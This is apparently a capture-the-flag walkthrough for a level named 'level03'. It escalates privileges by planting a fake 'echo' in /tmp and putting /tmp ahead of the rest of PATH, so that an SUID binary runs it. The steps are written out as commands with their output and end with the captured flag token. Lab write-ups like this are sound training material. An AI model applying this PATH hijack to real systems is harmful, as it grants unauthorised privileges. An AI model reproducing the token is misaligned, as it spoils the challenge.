1. List files in the directory:
   ll
   # Output shows: level03 binary with SUID permissions (rwsr-sr-x) owned by flag03

2. Execute the binary to see what it does:
   ./level03
   # Output: Exploit me

3. Analyze the binary to find how it works:
   strings level03 | grep echo
   # Output: /usr/bin/env echo Exploit me

4. Check current PATH:
   echo $PATH
   # Shows the directories where commands are searched

5. Create a malicious echo command:
   echo 'getflag' > /tmp/echo
   chmod +x /tmp/echo

6. Modify PATH to prioritize our malicious echo:
   export PATH=/tmp:$PATH

7. Verify PATH is modified:
   echo $PATH
   # /tmp is now first in PATH

8. Execute the binary again:
   ./level03
   # Now it executes our /tmp/echo instead of /usr/bin/echo
   # Output: Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
